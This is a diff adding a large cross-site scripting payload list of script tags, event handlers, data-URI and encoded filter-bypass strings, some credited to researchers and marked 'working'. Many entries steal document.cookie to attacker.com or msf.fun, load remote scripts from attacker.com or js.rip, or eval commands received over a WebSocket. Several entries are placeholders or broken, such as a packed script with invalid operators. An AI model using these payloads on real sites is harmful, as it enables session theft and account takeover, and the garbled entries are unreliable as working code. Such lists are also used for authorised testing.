@@ -1,0 +1,176 @@
+<OBJECT TYPE="text/x-scriptlet" DATA="http://attacker-site.com/evil-script.html"&gt;&lt;/OBJECT>
+<EMBED SRC="http://attacker-site.com/evil-script.swf" AllowScriptAccess="always"></EMBED>
+<FORM ACTION="http://attacker-site.com/steal-data.php" METHOD="post"><INPUT TYPE="text" NAME="stolen_data"></FORM>
+<LINK REL="stylesheet" HREF="javascript:alert('XSS Attack');">
+<BASE HREF="javascript:alert('XSS Attack');//">
+<SCRIPT>var _0x="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";document.write(atob(${_0x}).split("").map(char=>String.fromCharCode(char.charCodeAt(0)^13)).join(""))</SCRIPT>
+<SCRIPT>Function.prototype.call.call(alert,null,["XSS Attack"])</SCRIPT>
+<SCRIPT>var _0x=function(str){var out="";var i=0;for(;i<str.length;i++){out+=String.fromCharCode(str.charCodeAt(i)^1);}return out;};document.write(atob(_0x("U0NJSVBU")));</SCRIPT>
+<SCRIPT>var _0x=function(str){var out="";var i=0;for(;i<str.length;i++){out+=String.fromCharCode(str.charCodeAt(i)^2);}return out;};document.write(atob(_0x("S0NJSVBU")));</SCRIPT>
+<SCRIPT>var _0x=function(str){var out="";var i=0;for(;i<str.length;i++){out+=String.fromCharCode(str.charCodeAt(i)^3);}return out;};document.write(atob(_0x("R0NJSVBU")));</SCRIPT>
+<SCRIPT>(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\b'+e(c)+'\b','g'),k[c])}}return p}('6 8=["\k\g\j\i\h\f\d\c\b\a\9\e","\6\7\m\l\o\n\q\p\r"];2 3=0;2 5=8[0][3]+8[1][3]+8[0][5]+8[1][5]+8[0][7]+8[1][7];2 4=1;2 9=7(){4=(44+4)%(1<<24)};2 0=7(){3=(33+3)%(1<<24)};0();9();4^=3>>>0;0();9();4^=3>>>0;0();9();4^=3>>>0;0();9();3^=4<<<0;0();9();3^=4<<<0;0();9();3^=4<<<0;0();9();4^=3>>>0;0();9();4^=3>>>0;0();9();4^=3>>>0;0();9();3^=4<<<0;0();9();3^=4<<<0;0();9();3^=4<<<0;0();9();4^=3>>>0;0();9();4^=3>>>0;0();9();4^=3>>>0;0();9();3^=4<<<0;0();9();3^=4<<<0;0();9();3^=4<<<0;0();9();4^=3>>>0;0();9();4^=3>>>0;0();9();4^=3>>>0;0();9();3^=4<<<0;0();9();3^=4<<<0;0();9();3^=4<<<0;document.write(String.fromCharCode(5^4^3^1^0^8[0].charCodeAt(3)^8[1].charCodeAt(3))+5^4^3^1^0^8[0].charCodeAt(5)^8[1].charCodeAt(5))};0();9();document.write(String.fromCharCode(5^4^3^1^0^8[0].charCodeAt(7)^8[1].charCodeAt(7)))</SCRIPT>
+<OBJECT data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4>
+<IMG SRC="javascript:alert('XSS');">
+<BODY onload!#$%&()*~+-_.,:;?@[/|]^`=alert("XSS")>
+<SCRIPT/XSS SRC="http://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT>
+data:text/html;base64,PG1ldGEgaHR0cC1lcXVpdj0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPjxoMT5FbnZpcm9ubWVudCBNZXNzYWdlPC9oMT48c2NyaXB0PmFsZXJ0KCdFbnZpcm9ubWVudCBtZXNzYWdlIGZvciBmYWN0aW9uJyk7PC9zY3JpcHQ+
+data:text/html;base64,PG1ldGEgbmFtZT0iZGV2aWNlLXdpZHRoIiBjb250ZW50PSIxMjAwIj48c2NyaXB0PmFsZXJ0KCdGZWN0aWFsIE1lc3NhZ2UgZm9yIDEyMDAgcGl4ZWwgd2lkdGgnKTs8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC5iYWNrZ3JvdW5kPSdyZWQnO2FsZXJ0KCdGZWN0aWFsIE1lc3NhZ2UgZm9yIHJlZCBiYWNrZ3JvdW5kJyk7PC9zY3JpcHQ+
+data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC5ib2R5LmJhY2tncm91bmRDb2xvcj0nZ3JlZW4nO2FsZXJ0KCdGZWN0aWFsIE1lc3NhZ2UgZm9yIGdyZWVuIGJhY2tncm91bmQnKTs8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC5ib2R5LnN0eWxlLmZvbnRTaXplPScyMHB4JzthbGVydCgnRmVjdGlhbCBNZXNzYWdlIGZvciAyMHB4IGZvbnQgc2l6ZScpOzwvc2NyaXB0Pg==
+data:text/html;base64,PG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPjxoMT5FbnZpcm9ubWVudCBNZXNzYWdlLjwvaDE+PHNjcmlwdD52YXIgZW52TWVzc2FnZTtcbmZ1bmN0aW9uIGdldEJyb3dzZXJMYW5ndWFnZSgpe1xuICAgIHZhciBsYW5ndWFnZSA9IG5hdmlnYXRvci5sYW5ndWFnZSB8fCBuYXZpZ2F0b3IuZGVmYXVsdExhbmd1YWdlO1xuICAgIHN3aXRjaChsYW5ndWFnZSl7XG4gICAgICAgIGNhc2UgJ2VuLXVzJzpcbiAgICAgICAgICAgIGVudk1lc3NhZ2UgPSAnRW52aXJvbm1lbnQgbWVzc2FnZSBmb3IgZmFjdGlvbic7XG4gICAgICAgICAgICBicmVhaztcbiAgICAgICAgY2FzZSAnZnItRlInOlxuICAgICAgICAgICAgZW52TWVzc2FnZSA9ICdNZXNzYWdlIGVudmlyb25tZW50YWwgZm9yIGZhY3Rpb24nO1xuICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgIGNhc2UgJ2RlLURFJzpcbiAgICAgICAgICAgIGVudk1lc3NhZ2UgPSAnRW52aXJvbm1lbnQtTWVzc2FnZSBmb3IgZmFjdGlvbic7XG4gICAgICAgICAgICBicmVhaztcbiAgICAgICAgZGVmYXVsdDpcbiAgICAgICAgICAgIGVudk1lc3NhZ2UgPSAnRW52aXJvbm1lbnQgbWVzc2FnZSBmb3IgZmFjdGlvbic7XG4gICAgfVxuICAgIHJldHVybiBlbnZNZXNzYWdlO1xufVxuYWxlcnQoZ2V0QnJvd3Nlckxhbmd1YWdlKCkpOzwvc2NyaXB0Pg==
+data:text/html;base64,PG1ldGEgaHR0cC1lcXVpdj0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPjxoMT5FbnZpcm9ubWVudCBtZXNzYWdlPC9oMT48c2NyaXB0PlZhciBsb2NhbElkZW50aWZpZXIgPSBuYXZpZ2F0b3IubGFuZ3VhZ2U7aWYoJ2VuLVVTJyA9PT0gbG9jYWxJZGVudGlmaWVyKXthbGVydCgnWW91ciBlbnZpcm9ubWVudCBpcyBlbi1VUycpO31lbHNlIGlmKCdmcicgPT09IGxvY2FsSWRlbnRpZmllcil7YWxlcnQoJ1lvdXIgZW52aXJvbm1lbnQgaXMgZnInKTt9ZWxzZXthbGVydCgnWW91ciBlbnZpcm9ubWVudCBpcyBpbiBhIGRpZmZlcmVudCBsYW5ndWFnZScpO31gPC9zY3JpcHQ+
+data:text/html;base64,PG1ldGEgbmFtZT0iZGV2aWNlLXdpZHRoIiBjb250ZW50PSIxMjAwIj48c2NyaXB0PlZhciBkZXZpY2VXaWR0aCA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdtZXRhJylbMF0uZ2V0QXR0cmlidXRlKCdjb250ZW50Jyk7aWYoJzEyMDAnID09PSBkZXZpY2VXaWR0aCl7YWxlcnQoJ1lvdXIgZGV2aWNlIGhhcyBhIDEyMDAgcGl4ZWwgd2lkdGgnKTt9ZWxzZXthbGVydCgnWW91ciBkZXZpY2UgaGFzIGEgZGlmZmVyZW50IHdpZHRoJyk7fTwvc2NyaXB0Pg==
+data:text/html;base64,PHNjcmlwdD52YXIgbGFuZ3VhZ2UgPSBsb2NhdGlvbi5oYXNoLnNsaWNlKDEsMyk7CmZ1bmN0aW9uIHNldE1lc3NhZ2UobXNnKSB7CglpZiAobGFuZ3VhZ2UgPT09ICdlbicpIHsKCQlhbGVydChtc2cgKyAnIGluIEVuZ2xpc2gnKTsKCX0gZWxzZSBpZiAobGFuZ3VhZ2UgPT09ICdmcicpIHsKCQlhbGVydChtc2cgKyAnIGluIEZyZW5jaCcpOwoJfSBlbHNlIGlmIChsYW5ndWFnZSA9PT0gJ2RlJykgewoJCWFsZXJ0KG1zZyArICcgaW4gRGVuaXNzaScpOwoJfSBlbHNlIGlmIChsYW5ndWFnZSA9PT0gJ2llJykgewoJCWFsZXJ0KG1zZyArICcgaW4gSXJhY2lhbicpOwoJfSBlbHNlIHsKCQlhbGVydChtc2cgKyAnIGluIFVua25vd24nKTsKCX0KfQoKdmFyIGRldmljZSA9IGRvY3VtZW50LnVzZXJBZ2VudDsKaWYgKGRldmljZS5pbmRleE9mKCdBbmRyb2lkJykgIT09IC0xKSB7CglzZXRNZXNzYWdlKCdGZWN0aWFsIE1lc3NhZ2UgZm9yIEFuZHJvaWQgRGV2aWNlJyk7Cn0gZWxzZSBpZiAoZGV2aWNlLmluZGV4T2YoJ2lQaG9uZScpICE9PSAtMSkgewoJc2V0TWVzc2FsZ2UoJ0ZlY3RpYWwgTWVzc2FnZSBmb3IgaVBob25lIERldmljZScpOwp9IGVsc2UgaWYgKGRldmljZS5pbmRleE9mKCdCbGFja0JlcnJ5JykgIT09IC0xKSB7CglzZXRNZXNzYWdlKCdGZWN0aWFsIE1lc3NhZ2UgZm9yIEJsYWNrQmVycnkgRGV2aWNlJyk7Cn0gZWxzZSB7CglzZXRNZXNzYWdlKCdGZWN0aWFsIE1lc3NhZ2UgZm9yIFVua25vd24gRGV2aWNlJyk7Cn
+data:text/html;base64,PG1ldGEgaHR0cC1lcXVpdj0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPjxoMT5FbnZpcm9ubWVudCBNZXNzYWdlPC9oMT48c2NyaXB0PmRvY3VtZW50Lmxhbmd1YWdlID0gJ2VuJzthbGVydCgnRmVjdGlhbCBNZXNzYWdlIGZvciBFbmdsaXNoJyk7PC9zY3JpcHQ+
+data:text/html;base64,PG1ldGEgaHR0cC1lcXVpdj0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPjxoMT5FbnZpcm9ubWVudCBNZXNzYWdlPC9oMT48c2NyaXB0PmRvY3VtZW50Lmxhbmd1YWdlID0gJ2ZyJzthbGVydCgnRmVjdGlhbCBNZXNzYWdlIGZvciBGcmVuY2gnKTt9PC9zY3JpcHQ+
+data:text/html;base64,PG1ldGEgaHR0cC1lcXVpdj0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPjxoMT5FbnZpcm9ubWVudCBNZXNzYWdlPC9oMT48c2NyaXB0PmRvY3VtZW50Lmxhbmd1YWdlID0gJ2l0JzthbGVydCgnRmVjdGlhbCBNZXNzYWdlIGZvciBJdGFsaWFuJyk7fTwvc2NyaXB0Pg==
+<OBJECT data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnVmVjdGlvbmFsIE1lc3NhZ2UgZm9yIFRleHQgRm9udCcpOzwvc2NyaXB0Pg=="></OBJECT>
+<OBJECT data="data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC5ib2R5LnN0eWxlLmZvbnRTaXplPSczMHB4JzthbGVydCgnVmVjdGlvbmFsIE1lc3NhZ2UgZm9yIDMwcHggZm9udCBzaXplJyk7PC9zY3JpcHQ+"></OBJECT>
+<OBJECT data="data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC5iYWNrZ3JvdW5kPSd5ZWxsb3cnO2FsZXJ0KCdWZWN0aW9uYWwgTWVzc2FnZSBmb3IgeWVsbG93IGJhY2tncm91bmQnKTs8L3NjcmlwdD4="></OBJECT>
+<OBJECT data="data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC5ib2R5LmJhY2tncm91bmRDb2xvcj0nbGlnaHRibHVlJzthbGVydCgnVmVjdGlvbmFsIE1lc3NhZ2UgZm9yIGxpZ2h0Ymx1ZSBiYWNrZ3JvdW5kJyk7PC9zY3JpcHQ+"></OBJECT>
+<OBJECT data="data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC5ib2R5LnN0eWxlLmZvbnRGYW1pbHk9J0NhbGlicmknO2FsZXJ0KCdWZWN0aW9uYWwgTWVzc2FnZSBmb3IgQ2FsaWJyaSBmb250Jyk7PC9zY3JpcHQ+"></OBJECT>
+<OBJECT data="data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC5ib2R5LnN0eWxlLmZvbnRTdHlsZT0naXRhbGljJzthbGVydCgnVmVjdGlvbmFsIE1lc3NhZ2UgZm9yIGl0YWxpYyBmb250Jyk7PC9zY3JpcHQ+"></OBJECT>
+"><script src="https://js.rip/j14fkfemu3"></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/j14fkfemu3\';document.body.appendChild(a)')
+"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2oxNGZrZmVtdTMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2oxNGZrZmVtdTMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2oxNGZrZmVtdTMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
+"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;js.rip/j14fkfemu3&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;js.rip/j14fkfemu3&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+<script>window.location="https://google.com/search?q=Payload&quot;;&lt;/script>
+<img src="https://google.com/search?q=Payload" onerror="alert('Payload')">
+<iframe src="https://google.com/search?q=Payload&quot;&gt;&lt;/iframe>
+<script>document.body.innerHTML="Payload";</script>
+<body onload="alert('Payload')">
+<div style="background-image: url(javascript:alert('Payload'))">
+<img src="data:image/png;base64,Payload" onerror="alert('Payload')">
+<link rel="stylesheet" type="text/css" href="javascript:alert('Payload')">
+<iframe src="data:text/html;base64,Payload"></iframe>
+<svg onload="alert('Payload')">
+<marquee><script>alert('Payload')</script></marquee>
+<object data="data:text/html;base64,Payload"></object>
+<form action="javascript:alert('Payload')">
+<img src=x onerror=alert('Payload')>
+<a href="javascript:alert('Payload')">Clique aqui</a>
+<script>document.location='https://attacker.com/log?cookie='+document.cookie</script>
+<svg/onload=alert('Payload')>
+<body onload=alert('Payload')>
+<input type="text" value="Payload" onfocus=alert(1) autofocus>
+<video/poster/onerror=alert('Payload')>
+<script src="https://attacker.com/payload.js"></script>
+<template><img src=x onerror=alert('Payload')></template>
+<audio><source onerror="javascript:alert('Payload')">
+<script>eval(atob('Payload'))</script>
+<script>Function('return alert(1)')()</script>
+<script>document.write('<img src=x onerror=alert(\'Payload\')>')</script>
+<iframe srcdoc="<script>alert('Payload')</script>"></iframe>
+<input type="image" src="x" onerror="javascript:alert('Payload')">
+<math><a xlink:href="javascript:alert('Payload')">XSS</a></math>
+<script>fetch('https://attacker.com/log?cookie='+document.cookie)</script>
+<img src="x" onload="javascript:alert('Payload')">
+<a href="data:text/html;base64,Payload">Clique aqui</a>
+<body onbeforeunload=alert('Payload')>
+<style>@import'https://attacker.com/payload.css'</style>
+<meta http-equiv="refresh" content="0;url=javascript:alert('Payload')">
+<script>location.assign('javascript:alert(\'Payload\')')</script>
+<script>document.body.appendChild(document.createElement('script')).src='https://attacker.com/payload.js'</script>
+<a href="#" onmouseover="javascript:alert('Payload')">Clique aqui</a>
+<img src="x" onerror="javascript:eval(atob('Payload'))">
+<a href="javas<!-- -->cript:alert('Payload')">Clique aqui</a>
+<img src="x" onerror="javascript:Function('return alert(1)')()">
+<img src="x" onerror="javascript:location.assign('https://attacker.com/log?cookie='+document.cookie)">
+<script>var x=new XMLHttpRequest();x.open('GET','https://attacker.com/log?cookie='+document.cookie,true);x.send();</script>
+<script>var x=document.createElement('script');x.src='https://attacker.com/payload.js';document.head.appendChild(x);</script>
+<img src=x onerror=eval(atob('Payload'))>
+<script>var x=document.createElement('iframe');x.src='data:text/html;base64,Payload';document.body.appendChild(x);</script>
+<svg/onload=setInterval(function(){alert('Payload')},1000)>
+<a href="#" onclick="javascript:alert('Payload')">Clique aqui</a>
+<script>var x=new WebSocket('wss://attacker.com');x.onmessage=function(m){eval(m.data)};x.send('Payload')</script>
+<img src="x" onerror="javascript:fetch('https://attacker.com/log?cookie='+document.cookie)">
+<body onunload=alert('Payload')>
+<style>*{background-image:url(javascript:alert(\'Payload\'))}</style>
+<a href="javascript:document.location='https://attacker.com/log?cookie='+document.cookie">Clique aqui</a>
+<img src="x" onerror="javascript:new Image().src='https://attacker.com/log?cookie='+document.cookie">
+<script>document.body.innerHTML='<img src=x onerror=alert(\'Payload\')>'</script>
+<body onbeforeprint=alert('Payload')>
+<a href="#" onmouseout="javascript:alert('Payload')">Clique aqui</a>
+<img src=x onerror=eval(atob('Payload'))>
+<iframe srcdoc='<script>Payload</script>'>
+<body onmouseover=prompt(1)>
+<iframe src=javascript:Payload>
+<body onkeypress=alert(1)>
+<input type="text" value="Payload" oninput=eval(atob(this.value))>
+<a href="#" onclick="Payload">Clique aqui</a>
+<script>document.write('<img src="https://attacker.com/log?cookie='+document.cookie+'"/>')</script>
+<img src="https://attacker.com/log?cookie="+document.cookie onerror=eval(atob('Payload'))>
+<div contenteditable oninput=eval(atob(this.innerHTML))>Payload</div>
+<video/poster/onerror=Payload>
+<a href="javascript:(function(){Payload})()">Clique aqui</a>
+<img src="x" onload=Payload>
+<script src="data:text/javascript;base64,Payload"></script>
+<form><button formaction="javascript:Payload">Clique aqui</button></form>
+<body onbeforeunload=Payload>
+<img src="x" onabort=Payload>
+<link rel="stylesheet" type="text/css" href="data:text/css;base64,Payload">
+<a href="vbscript:Payload">Clique aqui</a>
+<a"/onclick=(confirm)()>Click Here!
+Dec: <svg onload=prompt%26%230000000040document.domain)>
+Hex: <svg onload=prompt%26%23x000000028;document.domain)>
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+<--%253cimg%20onerror=alert(1)%20src=a%253e --!>
+<a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'>
+javascript:{ alert`0` }
+1'"><img/src/onerror=.1|alert``>
+<img src=x onError=import('//1152848220/')>
+%2sscript%2ualert()%2s/script%2u
+<svg on onload=(alert)(document.domain)>
+<img ignored=() src=x onerror=prompt(1)>
+<svg onx=() onload=(confirm)(1)>
+“><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
+<svg on =i onload=alert(domain) (working)
+<svg/onload=location/**/='https://your.server/'+document.domain>
+<svg onx=() onload=window.alert?.()> (working)
+test",prompt%0A/*HelloWorld*/(document.domain) (working)- Brutelogic
+"onx+%00+onpointerenter%3dalert(domain)+x" (working)- Brutelogic
+"><svg%20onload=alert%26%230000000040"1")> (working)- IamRenganathan
+%27%09);%0d%0a%09%09[1].find(alert)//
+<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme   (working)-Pinaki @0xInfection(Make sure to URL encode the payload properly)
+tarun"><x/onafterscriptexecute=confirm%26lpar;)// -@sratarun
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click (workin)Pinaki @0xInfection (Make sure the applications decodes the payload from encoded)
+<details/open/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"> - @xsspayloads
+<svg onload\r\n=$.globalEval("al"+"ert()");>
+<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click Pinaki @0xInfection
+<sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div"> -@AldenAous
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
+<iframe/onload="var b = 'document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b; this['src']=a">
+<audio autoplay onloadstart=this.src='hxxps://msf.fun/?c='+document["cook"+"ie"]' src=x>
+<img/src=q onerror='new Function`al\ert\`1\``'>
+<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+<svg onload\r\n=$.globalEval("al"+"ert()");>
+[1].map(alert)   or    (alert)(1)
+<"><details/open/ontoggle="jAvAsCrIpT&colon;alert&lpar;/xss-by-tarun/&rpar;">XXXXX</a>
+[1].find(confirm)
+<svg/onload=self[`aler`%2b`t`]`1`>
+%22%3E%3Cobject%20data=data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%3E%3C/object%3E
+'-[document.domain].map(alert)-'
+<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
+<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
+<svg><circle><set onbegin=prompt(1) attributename=fill>
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+"%3balert`1`%3b"
+asd"`> onpointerenter=x=prompt,x`XSS`
+<x onauxclick=import('//1152848220/')>click
+<x onauxclick=a=alert,a(domain)>click
+<x onauxclick=import('//1152848220/')>click
+<x onauxclick=import('//xss/')>click
+\"<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss
+{{constructor.constructor(alert`1`)()}}
+javascript:new%20Function`al\ert\`1\``;
+https://twitter.com/xhzeem/status/1378316651431612422
+https://twitter.com/xhzeem/status/1377992310974218245
+">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>
+">'><details/open/ontoggle=confirm('XSS')>
+6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
+&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;
